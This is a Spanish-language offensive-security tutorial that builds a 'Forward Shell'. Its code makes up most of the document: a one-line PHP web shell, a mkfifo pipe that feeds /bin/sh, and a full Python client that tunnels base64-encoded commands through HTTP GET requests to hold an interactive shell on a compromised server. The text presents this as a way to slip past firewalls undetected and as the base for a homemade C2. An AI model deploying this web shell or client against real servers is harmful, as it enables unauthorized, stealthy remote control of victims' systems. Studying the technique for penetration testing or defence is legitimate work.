# 🔹 Introducción

En esta sección vamos a construir una **Forward Shell**, una alternativa muy útil cuando:

- Tenemos acceso a la víctima mediante una **web shell**.
- Podemos ejecutar comandos desde el navegador (ej: `cmd.php`).
- **NO podemos obtener una reverse shell** porque un firewall bloquea las conexiones salientes (TCP/UDP).

Una reverse shell depende de que la víctima pueda conectarse a nuestra máquina.  
Si el firewall bloquea conexiones salientes → estás atrapado con una web shell básica.

Ahí es donde aparece la **Forward Shell**:  
Una técnica que aprovecha **tuberías con nombre (mkfifo)** para conseguir una shell interactiva **sin necesidad de conexiones salientes**.  
Todo viaja como tráfico HTTP legítimo.

---

# 🧩 Web Shell Inicial

Creamos un archivo muy simple:

```php
<?php
  system($_GET['cmd']);
?>
```

Y con eso podemos hacer:

```
http://localhost/index.php?cmd=whoami
```

Respuesta:

```
www-data
```

## ⚠️ Limitaciones de una Web Shell

Una web shell básica:

- No mantiene contexto entre comandos
- No persistirá variables
- No puedes usar `cd` de forma real
- No permite programas interactivos (nano, vi, python -i…)
- STDERR no aparece salvo que redirijas (`2>&1`)

Ejemplo:

```
> cd /
> pwd
/var/www/html
```

Ejemplo de variable:

```
> variable="hola"
> echo $variable
```

Nada.  
Cada comando se ejecuta en un **proceso aislado**.

Esto hace que una web shell “normal” sea muy limitada.  
Para hacerlo funcional necesitamos **tuberías con nombre**.

## 🔧 Comandos útiles desde web shell

Para ver errores también (STDERR):

`2>&1`

Pero como el `&` rompe el URL, debemos usar:

`2>%261`

Ejemplo con CURL:

```bash
curl -s -X GET 'http://localhost/index.php' -G \
  --data-urlencode "cmd=cat /etc/hosts 2>&1"
```

- `-s` → modo silencioso
- `-X GET` → fuerza GET
- `-G` → pasamos parámetros GET
- `--data-urlencode` → URL encode automático
- `"cmd=..."` → comando a ejecutar

# 🧪 Script básico en Python

Un cliente que ejecuta comandos individuales:

```python
import requests
import signal
import os
from termcolor import colored

main_url = "http://localhost/index.php"

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", "red"))
    os._exit(1)

signal.signal(signal.SIGINT, def_handler)

def run_command(command):
    data = { 'cmd': command }
    r = requests.get(main_url, params=data)
    return r.text

while True:
    command = input(colored("> ", "yellow"))
    print(run_command(command))
```

Pero sigue siendo **una web shell sin estado**.

# 🏗️ El problema real: una shell necesita estado

Para que una shell sea útil necesitamos que el proceso:

✔ siga vivo  
✔ recuerde directorio, variables, etc.  
✔ acepte múltiples comandos interactivos

¿Cómo lo logramos?

# 🔩 mkfifo — El corazón de una Forward Shell

`mkfifo` crea una **Named Pipe** (tubería con nombre), que permite comunicación bidireccional entre procesos, incluso en sesiones separadas.

Comando clave:

```
mkfifo input; tail -f input | /bin/sh 2>&1 > output
```

Explicación:

- `mkfifo input` → crea pipe para entrada
- `tail -f input` → lee continuamente lo que escribamos en esa pipe
- `| /bin/sh` → ejecuta todo lo que entra
- `2>&1` → combina STDERR y STDOUT
- `> output` → redirige salida a otro archivo

Ahora tenemos:

- **input** → donde escribimos comandos
- **output** → donde leemos las respuestas

Y nunca se cierra, es **persistente**.

Esto nos permite construir nuestra Forward Shell.

# 🛠️ Forward Shell Completa en Python (Clase)

La versión final, organizada y funcional:

```python3
#!/usr/bin/env python3

import requests
import time

from termcolor import colored
from base64 import b64encode
from random import randrange


class ForwardShell:
    def __init__(self):
        session = randrange(1000, 9999)
        self.main_url = "http://localhost/index.php"
        self.stdin = f"/dev/shm/{session}.input"
        self.stdout = f"/dev/shm/{session}.output"

        self.pseudo_terminal = False
        self.promt = "> "


    def run_command(self, command):
        command = b64encode(command.encode()).decode()

        data = {
            'cmd' : 'echo %s | base64 -d | /bin/sh' % command
        }

        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text

        except:
            pass

        return None

    def write_stdin(self, command):
        command = b64encode(command.encode()).decode()

        data = {
            'cmd' : 'echo "%s" | base64 -d > %s' % (command, self.stdin)
        }

        requests.get(self.main_url, params=data)


    def read_stdout(self):
        for _ in range(5):
            read_stdout_command = f"/bin/cat {self.stdout}"
            output_command = self.run_command(read_stdout_command)
            time.sleep(0.2)

        return output_command


    def clear_stdout(self):
        clear_stdout_command = f"echo '' > {self.stdout}"
        self.run_command(clear_stdout_command)


    def setup_shell(self):
        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout)
        self.run_command(command)



    def remove_data(self):
        remove_data_command = f"/bin/rm {self.stdin} {self.stdout}"
        self.run_command(remove_data_command)


    def run(self):
        self.setup_shell()

        while True:
            self.clear_stdout()
            command = input(colored(f"{self.promt}", "yellow"))

            if "script /dev/null -c bash" in command:
                print(colored(f"\n[+] Se ha iniciado una pseudo-termianl.\n", "cyan"))
                self.pseudo_terminal = True
            
            self.write_stdin(command + "\n")
            output_command = self.read_stdout()

            if self.pseudo_terminal and "Script done" in output_command:
                print(colored("\n[!] Pseudo-terminal cerrada\n", "red"))
                self.pseudo_terminal = False
                self.promt = "> "
                continue


            if self.pseudo_terminal:
                self.promt = output_command.split('\n')[-1]
                print('\n'.join(output_command.split('\n')[2:-1]))

            else:
                print(output_command)
```

Lo esencial que contiene:

✔ comunicación por tuberías (`stdin` y `stdout` en `/dev/shm`)  
✔ comandos codificados en Base64 para evitar problemas con caracteres  
✔ lectura en bucle para extraer la salida  
✔ limpieza automática del buffer  
✔ soporte de pseudo-tty con:

```
script /dev/null -c bash
```

✔ detección de cierre (`Script done`)  
✔ ajuste del prompt dinámico  
✔ shell estable aunque la víctima tenga firewall

# 🚀 Uso

Ejecutas tu script:

```
python3 forwardshell.py
```

Lanzas la pseudo‑TTY:

```
script /dev/null -c bash
```

Ahora tienes:

- prompt dinámico (`user@host:~/path$`)
- interacción fluida
- puedes hacer:

```
php --interactive
python3
mysql -u root
```

Todo sin reverse shell.

---

# 🧠 ¿Por qué esto funciona incluso con firewall?

Porque **NO requiere conexiones salientes**.  
Todo el tráfico es:

- HTTP normal
- GET normales
- mismos parámetros que una web shell

El firewall nunca lo detecta como tráfico sospechoso.

# 🏁 Conclusión Final

Una Forward Shell permite:

- Mantener una sesión interactiva
- Sin reverse shells
- Sin conexiones entrantes/salientes
- Totalmente operativa incluso con firewalls estrictos

Es la herramienta perfecta cuando:

✔ Tienes RCE en web  
✘ No puedes abrir reverse shell  
✘ No hay SSH  
✔ Sí puedes leer y escribir archivos

La Forward Shell se convierte así en:

**una alternativa estable, silenciosa y extremadamente útil para operaciones manuales o como base para un C2 casero.**
